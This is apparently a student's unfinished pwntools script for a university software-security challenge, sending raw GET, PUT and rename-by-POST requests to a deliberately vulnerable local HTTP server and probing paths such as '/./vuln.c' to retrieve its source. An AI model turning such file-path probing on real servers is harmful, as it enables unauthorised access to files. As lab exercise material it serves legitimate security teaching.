#!/usr/bin/env python3

import pwn
import threading
import sys

pwn.context.arch = 'amd64'

# 1) docker compose -f debug.yml up
# 2) docker exec -ti "$(docker ps -q -f 'ancestor=softsec/httpd')" /bin/bash -c 'gdb -p "$(pgrep -n vuln)"'

port = 1024


def get_file(path):
    #while(True):
    #new_conn = pwn.remote("tasks.ws24.softsec.rub.de", port, level='error')
    new_conn = pwn.remote("127.0.0.1", port, level='error')

    payload = b'GET ' + path + b' HTTP/1.0\r\n\r\n'
    new_conn.sendline(payload)
    response = new_conn.recvall(timeout=1)
    new_conn.close()

    print(response)


def send_file(path, content):
    http_request = b'PUT ' + path + b' HTTP/1.0\r\n'
    http_request += b"Content-Type: text/plain\r\n"
    http_request += b"Content-Length: " + str(len(content)).encode() + b"\r\n"
    http_request += b"\r\n" 
    http_request += content
    new_conn = pwn.remote("127.0.0.1", port, level='error')
    new_conn.send(http_request)
    response = new_conn.recvall(timeout=1)
    new_conn.close()

    print(response)


def rename_file(oldpath, newpath):
    http_request =  b'POST ' + oldpath + b' HTTP/1.0\r\n'
    #http_request += b'HOST: httpd.tasks.softsec.rub.de:1024\r\n'
    http_request += b"Content-Type: text/plain\r\n"
    http_request += b"Content-Length: " + str(len(newpath)).encode() + b"\r\n"
    http_request += b"\r\n" 
    http_request += newpath


    new_conn = pwn.remote("127.0.0.1", port, level='error')
    new_conn.send(http_request)
    response = new_conn.recvall(timeout=1)
    new_conn.close()


#send_file(b'/test.txt', b'hello there guys\x00')
#get_file("")
#rename_file(b'/my_data.txt', b'extracted_data.txt')
#rename_file(b'/./vuln.c', b'export')
get_file(b'/vuln.c')

"""
t4 = threading.Thread(target=get_file, args={"/test"})
t4.start()
t4.join()
sys.exit()
"""